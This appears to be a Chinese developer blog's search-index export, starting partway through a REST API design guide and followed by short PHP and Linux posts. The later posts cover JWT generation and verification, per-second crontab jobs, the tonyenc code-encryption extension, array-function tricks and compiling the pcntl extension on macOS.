123GET /trades?status=closed&amp;sort=sortby=name&amp;order=asc# 可为其定制快捷方式GET /trades/recently_closed Authentication应该 使用 OAuth2.0 的方式为 API 调用者提供登录认证。必须 先通过登录接口获取 Access Token 后再通过该 token 调用需要身份认证的 API。 Oauth 的端点设计示列 RFC 6749 /token Twitter /oauth2/token Fackbook /oauth/access_token Google /o/oauth2/token Github /login/oauth/access_token Instagram /oauth/authorize 客户端在获得 access token 的同时 必须 在响应中包含一个名为 expires_in 的数据，它表示当前获得的 token 会在多少 秒 后失效。 12345&#123; "access_token": "token....", "token_type": "Bearer", "expires_in": 3600&#125; 客户端在请求需要认证的 API 时，必须 在请求头 Authorization 中带上 access_token。 1Authorization: Bearer token... 当超过指定的秒数后，access token 就会过期，再次用过期/或无效的 token 访问时，服务端 应该 返回 invalid_token 的错误或 401 错误码。 12345678HTTP/1.1 401 UnauthorizedContent-Type: application/jsonCache-Control: no-storePragma: no-cache&#123; "error": "invalid_token"&#125; Laravel 开发中，应该 使用 JWT 来为管理你的 Token，并且 一定不可 在 api 中间件中开启请求 session。 Response所有的 API 响应，必须 遵守 HTTP 设计规范，必须 选择合适的 HTTP 状态码。一定不可 所有接口都返回状态码为 200 的 HTTP 响应，如: 1234567891011HTTP/1.1 200 okContent-Type: application/jsonServer: example.com&#123; "code": 0, "msg": "success", "data": &#123; "username": "username" &#125;&#125; 常见的 HTTP 状态码 状态码 描述 1xx 代表请求已被接受，需要继续处理 2xx 请求已成功，请求所希望的响应头或数据体将随此响应返回 3xx 重定向 4xx 客户端引起的错误 5xx 服务端引起的错误 只有来自客户端的请求被正确的处理后才能返回 2xx 的响应，所以当 API 返回 2xx 类型的状态码时，前端 必须 认定该请求已处理成功。 必须强调的是，所有 API 一定不可 返回 1xx 类型的状态码。当 API 发生错误时，必须 返回出错时的详细信息。目前常见返回错误信息的方法有两种： 1、将错误详细放入 HTTP 响应首部； 123X-MYNAME-ERROR-CODE: 4001X-MYNAME-ERROR-MESSAGE: Bad authentication tokenX-MYNAME-ERROR-INFO: http://docs.example.com/api/v1/authentication 2、直接放入响应实体中； 123456789HTTP/1.1 401 UnauthorizedServer: nginx/1.11.9Content-Type: application/jsonTransfer-Encoding: chunkedCache-Control: no-cache, privateDate: Sun, 24 Jun 2018 10:02:59 GMTConnection: keep-alive&#123;"error_code":40100,"message":"Unauthorized"&#125; 考虑到易读性和客户端的易处理性，我们 必须 把错误信息直接放到响应实体中，并且错误格式 应该 满足如下格式：1234&#123; "message": "您查找的资源不存在", "error_code": 404001&#125; 其中错误码（error_code）必须 和 HTTP 状态码对应，也方便错误码归类，如： 123456789HTTP/1.1 429 Too Many RequestsServer: nginx/1.11.9Content-Type: application/jsonTransfer-Encoding: chunkedCache-Control: no-cache, privateDate: Sun, 24 Jun 2018 10:15:52 GMTConnection: keep-alive&#123;"error_code":429001,"message":"你操作太频繁了"&#125; 应该 在返回的错误信息中，同时包含面向开发者和面向用户的提示信息，前者可方便开发人员调试，后者可直接展示给终端用户查看如： 12345678&#123; "message": "直接展示给终端用户的错误信息", "error_code": "业务错误码", "error": "供开发者查看的错误信息", "debug": [ "错误堆栈，必须开启 debug 才存在" ]&#125; 下面详细列举了各种情况 API 的返回说明。 200 ok1234567891011121314151617181920212223242526272829303132200 状态码是最常见的 HTTP 状态码，在所有 成功 的 GET 请求中，必须 返回此状态码。HTTP 响应实体部分 必须 直接就是数据，不要做多余的包装。&#123; "data": [ &#123; "id": 1, "avatar": "https://lorempixel.com/640/480/?32556", "nickname": "fwest", "last_logined_time": "2018-05-29 04:56:43", "has_registed": true &#125;, &#123; "id": 2, "avatar": "https://lorempixel.com/640/480/?86144", "nickname": "zschowalter", "last_logined_time": "2018-06-16 15:18:34", "has_registed": true &#125; ], "meta": &#123; "pagination": &#123; "total": 101, "count": 2, "per_page": 2, "current_page": 1, "total_pages": 51, "links": &#123; "next": "http://api.example.com?page=2" &#125; &#125; &#125;&#125; 其中，分页和其他额外的媒体信息，必须放到 meta 字段中。 201 Created当服务器创建数据成功时，应该 返回此状态码。常见的应用场景是使用 POST 提交用户信息，如： 添加了新用户 上传了图片 创建了新活动 等，都可以返回 201 状态码。需要注意的是，你可以选择在用户创建成功后返回新用户的数据 123456789101112131415HTTP/1.1 201 CreatedServer: nginx/1.11.9Content-Type: application/jsonTransfer-Encoding: chunkedDate: Sun, 24 Jun 2018 09:13:40 GMTConnection: keep-alive&#123; "id": 1, "avatar": "https:\/\/lorempixel.com\/640\/480\/?32556", "nickname": "fwest", "last_logined_time": "2018-05-29 04:56:43", "created_at": "2018-06-16 17:55:55", "updated_at": "2018-06-16 17:55:55"&#125; 也可以返回一个响应实体为空的 HTTP Response 如： 123456HTTP/1.1 201 CreatedServer: nginx/1.11.9Content-Type: text/html; charset=UTF-8Transfer-Encoding: chunkedDate: Sun, 24 Jun 2018 09:12:20 GMTConnection: keep-alive 这里我们 应该 采用第二种方式，因为大多数情况下，客户端只需要知道该请求操作成功与否，并不需要返回新资源的信息。 202 Accepted该状态码表示服务器已经接受到了来自客户端的请求，但还未开始处理。常用短信发送、邮件通知、模板消息推送等这类很耗时需要队列支持的场景中； 返回该状态码时，响应实体 必须 为空。 123456HTTP/1.1 202 AcceptedServer: nginx/1.11.9Content-Type: text/html; charset=UTF-8Transfer-Encoding: chunkedDate: Sun, 24 Jun 2018 09:25:15 GMTConnection: keep-alive 204 No Content该状态码表示响应实体不包含任何数据，其中： 在使用 DELETE 方法删除资源 成功 时，必须 返回该状态码使用 PUT、PATCH 方法更新数据 成功 时，也 应该 返回此状态码 1234HTTP/1.1 204 No ContentServer: nginx/1.11.9Date: Sun, 24 Jun 2018 09:29:12 GMTConnection: keep-alive 3xx 重定向所有 API 一定不可 返回 3xx 类型的状态码。因为 3xx 类型的响应格式一般为下列格式: 123456789101112131415161718192021HTTP/1.1 302 FoundServer: nginx/1.11.9Content-Type: text/html; charset=UTF-8Transfer-Encoding: chunkedCache-Control: no-cache, privateDate: Sun, 24 Jun 2018 09:41:50 GMTLocation: https://example.comConnection: keep-alive&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8" /&gt; &lt;meta http-equiv="refresh" content="0;url=https://example.com" /&gt; &lt;title&gt;Redirecting to https://example.com&lt;/title&gt; &lt;/head&gt; &lt;body&gt; Redirecting to &lt;a href="https://example.com"&gt;https://example.com&lt;/a&gt;. &lt;/body&gt;&lt;/html&gt; API 一定不可 返回纯 HTML 结构的响应；若一定要使用重定向功能，应该 返回一个响应实体为空的 3xx 响应，并在响应头中加上 Location 字段: 1234567HTTP/1.1 302 FoundServer: nginx/1.11.9Content-Type: text/html; charset=UTF-8Transfer-Encoding: chunkedDate: Sun, 24 Jun 2018 09:52:50 GMTLocation: https://godruoyi.comConnection: keep-alive 400 Bad Request由于明显的客户端错误（例如，请求语法格式错误、无效的请求、无效的签名等），服务器 应该 放弃该请求。 当服务器无法从其他 4xx 类型的状态码中找出合适的来表示错误类型时，都 必须 返回该状态码。 123456789HTTP/1.1 400 Bad RequestServer: nginx/1.11.9Content-Type: application/jsonTransfer-Encoding: chunkedCache-Control: no-cache, privateDate: Sun, 24 Jun 2018 13:22:36 GMTConnection: keep-alive&#123;"error_code":40000,"message":"无效的签名"&#125; 401 Unauthorized该状态码表示当前请求需要身份认证，以下情况都 必须 返回该状态码。 未认证用户访问需要认证的 API access_token 无效/过期 客户端在收到 401 响应后，都 应该 提示用户进行下一步的登录操作。 12345678910HTTP/1.1 401 UnauthorizedServer: nginx/1.11.9Content-Type: application/jsonTransfer-Encoding: chunkedWWW-Authenticate: JWTAuthCache-Control: no-cache, privateDate: Sun, 24 Jun 2018 13:17:02 GMTConnection: keep-alive"message":"Token Signature could not be verified.","error_code": "40100"&#125; 403 Forbidden该状态码可以简单的理解为没有权限访问该请求，服务器收到请求但拒绝提供服务。 如当普通用户请求操作管理员用户时，必须 返回该状态码。 123456789HTTP/1.1 403 ForbiddenServer: nginx/1.11.9Content-Type: application/jsonTransfer-Encoding: chunkedCache-Control: no-cache, privateDate: Sun, 24 Jun 2018 13:05:34 GMTConnection: keep-alive&#123;"error_code":40301,"message":"权限不足"&#125; 404 Not Found该状态码表示用户请求的资源不存在，如 获取不存在的用户信息 （get /users/9999999） 访问不存在的端点 都 必须 返回该状态码，若该资源已永久不存在，则 应该 返回 401 响应。 405 Method Not Allowd当客户端使用的 HTTP 请求方法不被服务器允许时，必须 返回该状态码。 如客户端调用了 POST 方法来访问只支持 GET 方法的 API 该响应 必须 返回一个 Allow 头信息用以表示出当前资源能够接受的请求方法的列表。 12345678910HTTP/1.1 405 Method Not AllowedServer: nginx/1.11.9Content-Type: application/jsonTransfer-Encoding: chunkedAllow: GET, HEADCache-Control: no-cache, privateDate: Sun, 24 Jun 2018 12:30:57 GMTConnection: keep-alive&#123;"message":"405 Method Not Allowed","error_code": 40500&#125; 406 Not AcceptableAPI 在不支持客户端指定的数据格式时，应该返回此状态码。如支持 JSON 和 XML 输出的 API 被指定返回 YAML 格式的数据时。 Http 协议一般通过请求首部的 Accept 来指定数据格式 408 Request Timeout客户端请求超时时 必须 返回该状态码，需要注意的时，该状态码表示 客户端请求超时，在涉及第三方 API 调用超时时，一定不可 返回该状态码。 409 Gonfilct该状态码表示因为请求存在冲突无法处理。如通过手机号码提供注册功能的 API，当用户提交的手机号已存在时，必须 返回此状态码。 123456789HTTP/1.1 409 ConflictServer: nginx/1.11.9Content-Type: application/jsonTransfer-Encoding: chunkedCache-Control: no-cache, privateDate: Sun, 24 Jun 2018 12:19:04 GMTConnection: keep-alive&#123;"error_code":40900,"message":"手机号已存在"&#125; 410 Gone和 404 类似，该状态码也表示请求的资源不存在，只是 410 状态码进一步表示所请求的资源已不存在，并且未来也不会存在。在收到 410 状态码后，客户端 应该 停止再次请求该资源。 413 Request Entity Too Large该状态码表示服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。 此种情况下，服务器可以关闭连接以免客户端继续发送此请求。 如果这个状况是临时的，服务器 应该 返回一个 Retry-After 的响应头，以告知客户端可以在多少时间以后重新尝试。 414 Request-URI Too Long该状态码表示请求的 URI 长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。 415 Unsupported Media Type通常表示服务器不支持客户端请求首部 Content-Type 指定的数据格式。如在只接受 JSON 格式的 API 中放入 XML 类型的数据并向服务器发送，都 应该 返回该状态码。 该状态码也可用于如：只允许上传图片格式的文件，但是客户端提交媒体文件非法或不是图片类型，这时 应该 返回该状态码： 123456789HTTP/1.1 415 Unsupported Media TypeServer: nginx/1.11.9Content-Type: application/jsonTransfer-Encoding: chunkedCache-Control: no-cache, privateDate: Sun, 24 Jun 2018 12:09:40 GMTConnection: keep-alive&#123;"error_code":41500,"message":"不允许上传的图片格式"&#125; 429 Too Many Request该状态码表示用户请求次数超过允许范围。如 API 设定为 60次/分钟，当用户在一分钟内请求次数超过 60 次后，都 应该 返回该状态码。并且也 应该 在响应首部中加上下列头部： 1234X-RateLimit-Limit: 10 请求速率（由应用设定，其单位一般为小时/分钟等，这里是 10次/5分钟）X-RateLimit-Remaining: 0 当前剩余的请求数量X-RateLimit-Reset: 1529839462 重置时间Retry-After: 120 下一次访问应该等待的时间（秒） 列子 12345678910111213HTTP/1.1 429 Too Many RequestsServer: nginx/1.11.9Content-Type: application/jsonTransfer-Encoding: chunkedX-RateLimit-Limit: 10X-RateLimit-Remaining: 0X-RateLimit-Reset: 1529839462Retry-After: 290Cache-Control: no-cache, privateDate: Sun, 24 Jun 2018 11:19:32 GMTConnection: keep-alive&#123;"message":"You have exceeded your rate limit.","error_code":42900&#125; 必须 为所有的 API 设置 Rate Limit 支持。 500 Internal Server Error该状态码 必须 在服务器出错时抛出，对于所有的 500 错误，都 应该 提供完整的错误信息支持，也方便跟踪调试。 503 Service Unavailable该状态码表示服务器暂时处理不可用状态，当服务器需要维护或第三方 API 请求超时/不可达时，都 应该 返回该状态码，其中若是主动关闭 API 服务，应该在返回的响应首部加上 Retry-After 头部，表示多少秒后可以再次访问。 12345678910HTTP/1.1 503 Service UnavailableServer: nginx/1.11.9Content-Type: application/jsonTransfer-Encoding: chunkedCache-Control: no-cache, privateDate: Sun, 24 Jun 2018 10:56:20 GMTRetry-After: 60Connection: keep-alive&#123;"error_code":50300,"message":"服务维护中"&#125; 其他 HTTP 状态码请参考 HTTP 状态码- 维基百科。]]></content>
      <categories>
        <category>api</category>
      </categories>
      <tags>
        <tag>api</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[轻松生成jwt的插件]]></title>
    <url>%2F2019%2F5%2F%E8%BD%BB%E6%9D%BE%E7%94%9F%E6%88%90jwt%E7%9A%84%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[前言json web token，无需多说 安装1composer require lcobucci/jwt 参数说明 iss 【issuer】发布者的url地址 aud 【audience】接受者的url地址 sub 【subject】该JWT所面向的用户，用于处理特定应用，不是常用的字段 exp 【expiration】 该jwt销毁的时间；unix时间戳 nbf 【not before】 该jwt的使用时间不能早于该时间；unix时间戳 iat 【issued at】 该jwt的发布时间；unix 时间戳 jti 【JWT ID】该jwt的唯一ID编号 生成token1234567891011121314151617181920212223242526272829&lt;?phprequire './vendor/autoload.php';use Lcobucci\JWT\Builder;use Lcobucci\JWT\Signer\Hmac\Sha256;use Lcobucci\JWT\Signer\Key;//发布端url$iss = 'http://admin.jwt.com';//请求端URL$aud = 'http://api.jwt.com/user/login';//唯一的jwt id$jwt_id = 'jwt123';//私钥，用于token验证$signer_key = 'jwt-test';$signer = new Sha256();$token = (new Builder())-&gt;issuedBy($iss) -&gt;permittedFor($aud) -&gt;identifiedBy($jwt_id, true) -&gt;issuedAt(time()) -&gt;canOnlyBeUsedAfter(time() + 60) -&gt;expiresAt(time() + 3600) -&gt;set('user', ['name' =&gt; 'police', 'mobile' =&gt; '110']) -&gt;withClaim('uid', 1) -&gt;getToken($signer, new Key($signer_key));echo $token; 验证token123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phprequire './vendor/autoload.php';use Lcobucci\JWT\ValidationData;use Lcobucci\JWT\Parser;use Lcobucci\JWT\Signer\Hmac\Sha256;$token = $_GET['token'] ?? '';$token = (new Parser())-&gt;parse((string) $token);$signer = new Sha256();$aud = $token-&gt;getClaim('aud');$iss = $token-&gt;getClaim('iss');$jwt_id = $token-&gt;getHeader('jti');$user = $token-&gt;getClaim('user');$signer_key = 'jwt-test'; //私钥$data = new ValidationData();$data-&gt;setIssuer($iss);$data-&gt;setAudience($aud);$data-&gt;setId($jwt_id);//验证私钥var_dump($token-&gt;verify($signer, $signer_key));//失败，因为token在60秒后方可验证var_dump($token-&gt;validate($data));//修改验证时间$data-&gt;setCurrentTime(time() + 60);// truevar_dump($token-&gt;validate($data));$data-&gt;setCurrentTime(time() + 4000);//false,token过期var_dump($token-&gt;validate($data));]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[crontab实现N秒定时]]></title>
    <url>%2F2019%2F5%2Fcrontab%E5%AE%9E%E7%8E%B0N%E7%A7%92%E5%AE%9A%E6%97%B6%2F</url>
    <content type="text"><![CDATA[前言crontab 命令最小的执行时间是一分钟，有时需要按秒执行定时任务，有两种方法可以实现 使用延时来实现每N秒执行通过延时方法 sleep N 来实现每N秒执行，首先创建一个php脚本test.php,本例test.php放在home目录下，功能是把当前时间写入/log/run.log 1crontab -e 输入以下语句保存退出： 123456* * * * * php /home/test.php* * * * * sleep 10; php /home/test.php* * * * * sleep 20; php /home/test.php* * * * * sleep 30; php /home/test.php* * * * * sleep 40; php /home/test.php* * * * * sleep 50; php /home/test.php 使用 tail -f 查看执行情况 1tail -f /log/run.log 60必须能整除间隔的秒数，如果间隔的秒数太少，例如2秒执行一次，这样就需要在crontab 加入60/2=30条语句 编写shell脚本实现在脚本中使用for语句指定秒数执行，创建脚本文件crontab.sh,j本例放在home目录下： 12345678910#!/bin/bashstep=2 #间隔的秒数，不能大于60for (( i = 0; i &lt; 60; i=(i+step) )); do $(php '/home/test.php') sleep $stepdoneexit 0 crontab -e 输入以下语句后保存退出： 1* * * * * /home/crontab.sh 使用 tail -f 查看执行情况，可以发现run.log每2秒被写入一条记录。如果60不能整除间隔的秒数，则需要调整执行的时间。例如需要每7秒执行一次，就需要找到7与60的最小公倍数，7与60的最小公倍数是420（即7分钟）。 则 crontab.sh step的值为7，循环结束条件i&lt;420， crontab=”” -e可以输入以下语句来实现:&lt;=&quot;&quot; p=&quot;&quot;&gt; 1*/7 * * * * /home/crontab.sh]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php代码加密-tonyenc]]></title>
    <url>%2F2019%2F5%2Ftonyenc%2F</url>
    <content type="text"><![CDATA[前言最近公司出售了一个项目，商业源码自然要加密，网上的一些加密被破解的可能性较大，用起来也不方便，作为github的伟大搬运工，找到了一个简洁、高性能、跨平台的 PHP7 代码加密扩展-tonyenc github项目地址：https://github.com/lihancong/tonyenc 安装123456789git clone https://github.com/lihancong/tonyenccd tonyencphpize./configure --with-php-config = [自己php版本的php-config文件]make &amp;&amp; make install php版本要7.0以上 修改php.ini文件追加扩展 1extension=tonyenc.so MAMP软件中修改php.ini模版文件，是无效的，要修改真实的php.ini文件 搞定后重启环境，测试是否成功 1php -m |grep tonyenc 加密加密不可逆，切记要备份！！！！加密文件，这个文件它提供了，名字叫tonyenc.php，复制保存到合适位置，然后执行 1php tonyenc.php [需要加密的文件或路径]]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[短链接]]></title>
    <url>%2F2019%2F5%2F%E7%9F%AD%E9%93%BE%E6%8E%A5%2F</url>
    <content type="text"><![CDATA[最近一个项目中要求使用短链接，谷歌了一下明白基本原理，懒得自己动手，随便找了一个php github项目 github项目地址https://github.com/achais/shorturl 新浪微博app keyhttps://fengmk2.com/blog/appkey.html 基本实现需求]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0 1 互转]]></title>
    <url>%2F2019%2F5%2F0%201%E4%BA%92%E8%BD%AC%2F</url>
    <content type="text"><![CDATA[平时翻转0、1操作，一般使用if语句或三目运算符完成，有些繁琐 按位非1~value + 2; 异或121 ^ 1 = 0;1 ^ 0 = 1;]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[巧用PHP数组函数]]></title>
    <url>%2F2019%2F5%2F%E5%B7%A7%E7%94%A8%20PHP%20%E6%95%B0%E7%BB%84%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[PHP 的数组是一种很强大的数据类型，与此同时 PHP 内置了一系列与数组相关的函数可以很轻易的实现日常开发的功能，善用 PHP 内置函数能极大的提高开发效率和运行效率（内置函数都是用 C 写的效率比用 PHP 写的高很多） 取指定键名对于某些关联数组，有时候我们只想取指定键名的那部分，比如数组为 [&#39;id&#39; =&gt; 1, &#39;name&#39; =&gt; &#39;zane&#39;, &#39;password&#39; =&gt; &#39;123456&#39;] 此时若只想取包含 id 和 name 123456789101112131415161718192021&lt;?php$raw = ['id' =&gt; 1, 'name' =&gt; 'zane', 'password' =&gt; '123456'];// 自己用 PHP 实现function onlyKeys($raw, $keys) &#123; $new = []; foreach ($raw as $key =&gt; $val) &#123; if (in_array($key, $keys)) &#123; $new[$key] = $val; &#125; &#125; return $new;&#125;// 用 PHP 内置函数实现function newOnlyKeys($array, $keys) &#123; return array_intersect_key($array, array_flip($keys));&#125;var_dump(onlyKeys($raw, ['id', 'name']));// 结果 ['id' =&gt; 1, 'name' =&gt; 'zane']var_dump(newOnlyKeys($raw, ['id', 'name']));// 结果 ['id' =&gt; 1, 'name' =&gt; 'zane'] 简单的介绍一下这两个函数的作用，首先是 array_flip 函数，这个函数的功能是「将数组的键和值对调」，也就是键名变成值，值变成键名。我们传递的 $keys 参数经过这个函数便从 [0 =&gt; &#39;id&#39;, 1 =&gt; &#39;name&#39;] 转变为了 [&#39;id&#39; =&gt; 0, &#39;name&#39; =&gt; 1]。这样做的目的是为了向 array_intersect_key 函数服务，array_intersect_key 函数的功能是「使用键名比较计算数组的交集」，也就是返回第一个参数数组中与其他参数数组相同键名的值 移除指定键名123456789&lt;?php$raw = ['id' =&gt; 1, 'name' =&gt; 'zane', 'password' =&gt; '123456'];// 用 PHP 内置函数实现function removeKeys($array, $keys) &#123; return array_diff_key($array, array_flip($keys));&#125;// 移除 id 键var_dump(removeKeys($raw, ['id', 'password']));// 结果 ['name' =&gt; 'zane'] 和上一个例子相比本例只是将 array_intersect_key 函数改为 array_diff_key(刚好和 array_intersect_key 的功能相反) 数组去重PHP 内置了 array_unique 函数 12345&lt;?php$input = ['you are' =&gt; 666, 'i am' =&gt; 233, 'he is' =&gt; 233, 'she is' =&gt; 666];$result = array_unique($input);var_dump($result);// 结果 ['you are' =&gt; 666, 'i am' =&gt; 233] 用这个函数就能解决大部分问题了，但是有时候可能会觉得它不够快，原因如下： array_unique() 先将值作为字符串排序，然后对每个值只保留第一个遇到的键名，接着忽略所有后面的键名 因为这个函数会先将数组进行排序，所以速度可能在某些场景达不到预期的要求 续调用两次 array_flip 函数是不是就相当于实现了 array_unique 函数的功能？ 12345&lt;?php$input = ['you are' =&gt; 666, 'i am' =&gt; 233, 'he is' =&gt; 233, 'she is' =&gt; 666];$result = array_flip(array_flip($input));var_dump($result);// 结果 ['she is' =&gt; 666, 'he is' =&gt; 233] 结果和 array_unique 的不一样，我们可以从 PHP 官方手册得到答案 如果同一个值出现多次，则最后一个键名将作为它的值，其它键会被丢弃 array_unique 保留第一个出现的键名，array_flip保留最后一个出现的键名 注意： 使用 array_flip 作为数组去重时数组的值必须能够作为键名（即为 string 类型或 integer 类型），否则这个值将被忽略 此外，若不需要保留键名可以直接这样使用 array_values(array_flip($input)) 重置索引当想要对一个索引并不连续的数组进行重置时，比如数组：[0 =&gt; 233, 99 =&gt; 666]，对于这种数组我们只需要调用 array_values 函数即可实现 1234&lt;?php$input = [0 =&gt; 233, 99 =&gt; 666];var_dump(array_values($input));// 结果 [0 =&gt; 233, 1 =&gt; 66] 需要注意的是 array_values 函数并不止重置数字索引还会将字符串键名也同样删除并重置，如果想要保留字符串键名的同时重置数字索引，使用 array_slice 函数 1234&lt;?php$input = ['hello' =&gt; 'world', 0 =&gt; 233, 99 =&gt; 666];var_dump(array_slice($input, 0));// 结果 ['hello' =&gt; 'world', 0 =&gt; 233, 1 =&gt; 66] array_slice 函数的功能是取出数组的中的一段，但它默认会重新排序并重置数组的数字索引，所以可以利用它重置数组中的数字索引 清除空值有时候想清除某个数组中的空值比如：null、false、0、0.0、[]空数组、’’空字符串、’0’字符串0 ，这时 array_filter 函数便能帮上忙 1234&lt;?php$input = ['foo', false, -1, null, '', []];var_dump(array_filter($input));// 结果 [0 =&gt; 'foo', 2 =&gt; -1] array_filter 的作用其实是「用回调函数过滤数组中的单元」，它的第二个参数其实是个回调函数，向数组的每个成员都执行这个回调函数，若回调函数的返回值为 true 便保留这个成员，为 false 则忽略。这个函数还有一个特性就是： 如果没有提供 callback 函数， 将删除 array 中所有等值为 FALSE 的条目 注意： 如果不填写 callback 函数，0、0.0、’0’字符串0 这些可能有意义的值会被删除。所以如果清除的规则有所不同还需要自行编写 callback 函数 确认数组成员全部为真有时候我们希望确认数组中的的值全部为 true，比如：[&#39;read&#39; =&gt; true, &#39;write&#39; =&gt; true, &#39;execute&#39; =&gt; true]，只需要用 array_product 函数便可以实现了 1234567&lt;?php$power = ['read' =&gt; true, 'write' =&gt; true, 'execute' =&gt; true];var_dump((bool)array_product($power));// 结果 true$power = ['read' =&gt; true, 'write' =&gt; true, 'execute' =&gt; false];var_dump((bool)array_product($power));// 结果 false array_product 函数本来的功能是「计算数组中所有值的乘积」，在累乘数组中所有成员的时候会将成员的值转为数值类型。当传递的参数为一个 bool 成员所组成的数组时，true 会被转为 1，false 会被转为 0。然后只要数组中出现一个 false 累乘的结果自然会变成 0，然后再将结果转为 bool 类型不就是 false 注意： 使用 array_product 函数将在计算过程中将数组成员转为数值类型进行计算，所以请确保了解数组成员转为数值类型后的值，否则会产生意料之外的结果 1234&lt;?php$power = ['read' =&gt; true, 'write' =&gt; true, 'execute' =&gt; 'true'];var_dump((bool)array_product($power));// 结果 false 因为 ‘true’ 在计算过程中被转为 0 获取指定键名之前 / 之后的数组如果只想要关联数组中指定键名值之前的部分可以通过 array_keys、array_search 和 array_slice 组合使用便能够实现 1234567891011121314&lt;?php$data = ['first' =&gt; 1, 'second' =&gt; 2, 'third' =&gt; 3];function beforeKey($array, $key) &#123; $keys = array_keys($array); // $keys = [0 =&gt; 'first', 1 =&gt; 'second', 2 =&gt; 'third'] $len = array_search($key, $keys); return array_slice($array, 0, $len);&#125;var_dump(beforeKey($data, 'first'));// 结果 []var_dump(beforeKey($data, 'second'));// 结果 ['first' =&gt; 1]var_dump(beforeKey($data, 'third'));// 结果 ['first' =&gt; 1, 'second' =&gt; 2] array_slice 这个函数取出部分数组是根据偏移量（可以理解为键名在数组中的顺序，从 0 开始）而不是根据键名的，而关联数组的键名却是是字符串或者是不按顺序的数字，此时要解决的问题便是「如何取到键名对应的偏移量」 array_keys 函数的功能是「返回数组中部分的或所有的键名」默认返回全部键名，此外返回的键名数组是以数字索引的，也就是说返回的键名数组的索引就是偏移量，的原数组变为：[0 =&gt; &#39;first&#39;, 1 =&gt; &#39;second&#39;, 2 =&gt; &#39;third&#39;] 然后通过 array_search 便可以获得指定键名的偏移量了，因为这个函数的功能是「在数组中搜索给定的值，如果成功则返回首个相应的键名」 有了偏移量直接调用 array_slice 函数便可以实现目的了 那获取指定键名之后的数组也就轻而易举了，略微修改 array_slice 即可 12345678910111213&lt;?php$data = ['first' =&gt; 1, 'second' =&gt; 2, 'third' =&gt; 3];function afterKey($array, $key) &#123; $keys = array_keys($array); $offset = array_search($key, $keys); return array_slice($array, $offset + 1);&#125;var_dump(afterKey($data, 'first'));// 结果 ['second' =&gt; 2, 'third' =&gt; 3]var_dump(afterKey($data, 'second'));// 结果 ['third' =&gt; 3]var_dump(afterKey($data, 'third'));// 结果 [] 获取指定值之前或之后的数组，只需调用 beforeKey($data, array_search($value, $data)) 数组中重复次数最多的值假设有这样一个数组 [6, 11, 11, 2, 4, 4, 11, 6, 7, 4, 2, 11, 8]，如何获取数组中重复次数最多的值？关键在于 array_count_values 函数 12345678&lt;?php$data = [6, 11, 11, 2, 4, 4, 11, 6, 7, 4, 2, 11, 8];$cv = array_count_values($data);// $cv = [6 =&gt; 2, 11 =&gt; 4, 2 =&gt; 2, 4 =&gt; 3, 7 =&gt; 1, 8 =&gt; 1]arsort($cv);$max = key($cv);var_dump($max);// 结果 11 array_count_values函数的功能是「统计数组中所有的值」，就是将原数组中的值作为返回数组的键名，值出现的次数作为返回数组的值 这样便可以通过 arsort 函数对出现的次数进行降序排序并且保持索引关联 最后使用 key 获得当前单元（当前单元默认为数组第一个成员）的键名，此时的键名即是原数组的值重复次数最多的值]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mac 安装 PHP 扩展 pcntl]]></title>
    <url>%2F2019%2F5%2FMac%E5%AE%89%E8%A3%85PHP%E6%89%A9%E5%B1%95%E4%B9%8Bpcntl%2F</url>
    <content type="text"><![CDATA[在 Mac 下做 PHP 开发用的是 MAMP 集成开发环境，出现 PHP 不支持 pcntl 扩展，查下谷歌发现 MAMP 的集成环境是没有这个扩展包的，需要手动编译安装这个包。 具体步骤123456789101112131415161718# 下载源码包wget http://cn.php.net/distributions/php-7.2.1.tar.gz# 解压tar zxvf php-7.2.1.tar.gz# 进入文件执行编译cd php-7.2.1/ext/pcntlphpize./configuremake# 拷贝编译.so文件到MAMP extensions目录(具体的文件夹看自己的目录哦)cp modules/pcntl.so /Applications/MAMP/bin/php/php7.2.1/lib/php/extensions/no-debug-non-zts-20170718# 编辑php.ini引入扩展echo "extension=pcntl.so" &gt;&gt; /Applications/MAMP/bin/php/php7.2.1/conf/php.ini 检查是否安装成功12php --ri pcntl]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>mac</tag>
      </tags>
  </entry>
</search>
